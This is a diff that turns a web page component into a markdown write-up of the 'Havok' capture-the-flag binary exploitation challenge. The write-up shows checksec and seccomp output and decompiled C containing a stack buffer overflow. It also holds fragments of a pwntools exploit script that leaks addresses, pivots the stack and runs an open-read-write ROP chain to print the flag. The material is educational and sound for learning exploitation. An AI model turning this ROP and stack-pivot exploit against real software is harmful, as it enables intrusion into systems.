@@ -1,12 +1,3 @@
-import Content from "@/components/Content";
-
-const menuItems = [
-    {
-        key: 'havok',
-        type: ['rop', 'stackpivot'],
-        id: 'havok',
-        label: 'Havok',
-        contents: `
 # HAVOK
 
 ## Description
@@ -16,7 +7,7 @@ in C using IDA.
 ## Analysis
 
 Firstly, I check the protection of the binary file. It came as no surprise that the binary is protected by Full RELRO, ASLR, NX, and PIE. It also bans execve, fork, and clone syscalls.
-\`\`\` bash
+``` bash
 Jaden@JadenPwner:/challenge$ pwn checksec ./havok
 
 Arch:       amd64-64-little
@@ -26,9 +17,9 @@ NX:         NX enabled
 PIE:        PIE enabled
 Stripped:   No
 Debuginfo:  Yes
-\`\`\`
+```
 
-\`\`\` bash
+``` bash
 Jaden@JadenPwner:/challenge$ seccomp-tools dump ./havok
 
  line  CODE  JT   JF      K
@@ -43,10 +34,10 @@ Jaden@JadenPwner:/challenge$ seccomp-tools dump ./havok
  0007: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0009
  0008: 0x06 0x00 0x00 0x00000000  return KILL
  0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
-\`\`\`
+```
 
 Secondly, I generate C pseudocode from the excutable files
-\`\`\`c
+```c
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   setvbuf(stdout, 0, 2, 0);
@@ -68,7 +59,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
   puts(&unk_23F8);
   return 0;
 }
-\`\`\`
+```
 
 ### Brainstorm
 <details>
@@ -89,7 +80,7 @@ overflow the idx_buf to get the address of main and puts. I only need the last t
 .
 
 
-\`\`\`c
+```c
 void __cdecl calibrate_rings()
 {
   int i; // [rsp+8h] [rbp-E8h]
@@ -110,31 +101,31 @@ void __cdecl calibrate_rings()
   puts("         Probe a ring-energy slot (valid: 0 - 3):");
   memset(idx_buf, 0, sizeof(idx_buf));
   read(0, idx_buf, 31);
-  idx_buf[strcspn(idx_buf, "\\n")] = 0;
+  idx_buf[strcspn(idx_buf, "\n")] = 0;
   raw = atoi(idx_buf);
   if ( raw >= 0 )
   {
     if ( (__int16)raw > 3 )
       puts("[!] Index out of calibration range.");
     else
-      printf("[*] Ring-%d energy: 0x%016llx\\n", (__int16)raw, frame.ring_data[(__int16)raw]);
+      printf("[*] Ring-%d energy: 0x%016llx\n", (__int16)raw, frame.ring_data[(__int16)raw]);
     puts("    Provide a label for this ring reading:");
     memset(label, 0, 128);
     read(0, label, 127);
-    label[strcspn(label, "\\n")] = 0;
+    label[strcspn(label, "\n")] = 0;
     for ( i = 0; label[i]; ++i )
     {
       if ( label[i] == '%' )
         label[i] = '_';
     }
-    printf("[LOG] %s\\n", label);
+    printf("[LOG] %s\n", label);
   }
   else
   {
     puts("[!] Negative indices are not permitted.");
   }
 }
-\`\`\`
+```
 
 </details>
 
@@ -144,14 +135,14 @@ void __cdecl calibrate_rings()
 .bss:
     plasma_sig
 
-\`\`\`c
+```c
 void __cdecl read_plasma_signature()
 {
-  puts("\\n[RING 3] Upload Plasma Signature (up to 256 bytes):");
+  puts("\n[RING 3] Upload Plasma Signature (up to 256 bytes):");
   plasma_len = read(0, plasma_sig, 256);
   if ( plasma_len > 0 )
   {
-    printf("[*] Signature received (%zd bytes). Buffered in cosmic memory.\\n", plasma_len);
+    printf("[*] Signature received (%zd bytes). Buffered in cosmic memory.\n", plasma_len);
   }
   else
   {
@@ -160,16 +151,16 @@ void __cdecl read_plasma_signature()
   }
 }
 }
-\`\`\`
+```
 </details>
 
 <details>
 <summary>Function inject_plasma()</summary>
 
 We can easily see a buffer overflow bug here. We can overflow the confirm buffer
-and overwrite \`rbp\` and \`rip\` to jump to the address of ROP chain
+and overwrite `rbp` and `rip` to jump to the address of ROP chain
 
-\`\`\` c
+``` c
 void __cdecl inject_plasma()
 {
   char confirm[32]; // [rsp+0h] [rbp-20h] BYREF
@@ -178,7 +169,7 @@ void __cdecl inject_plasma()
   {
     if ( validate_plasma() )
     {
-      puts("\\n[RING 3] Initiating plasma injection sequence...");
+      puts("\n[RING 3] Initiating plasma injection sequence...");
       puts("         Confirm injection key:");
       read(0, confirm, 48);
       puts("[*] Injection acknowledged.");
@@ -193,11 +184,11 @@ void __cdecl inject_plasma()
     puts("[!] No plasma signature loaded. Aborting.");
   }
 }
-\`\`\`
+```
 </details>
 
 ## Exploitation
-\`\`\`python
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -317,7 +308,7 @@ chain += p64(ROP_poprdx_xoreaxeax_ret) + p64(100)
 chain += p64(ROP_poprax_ret) + p64(1)
 chain += p64(LIBC_syscall_ret_in___lll_lock_wake_private)
 
-chain += flag_str + b'\\x00'
+chain += flag_str + b'\x00'
 
 sl(chain)
 
@@ -331,17 +322,4 @@ overwrite_payload = b'a' * 32 + p64(fake_rbp) + p64(ROP_leave_ret)
 sl(overwrite_payload)
 
 p.interactive()
-\`\`\`
-        `
-    }
-]
-
-const ApoorvCtf = () => {
-    return (
-        <div className="max-w-2xl flex flex-col gap-4 markdown-content">
-            <Content menuItems={menuItems} />
-        </div>
-    );
-};
-
-export default ApoorvCtf;
+```
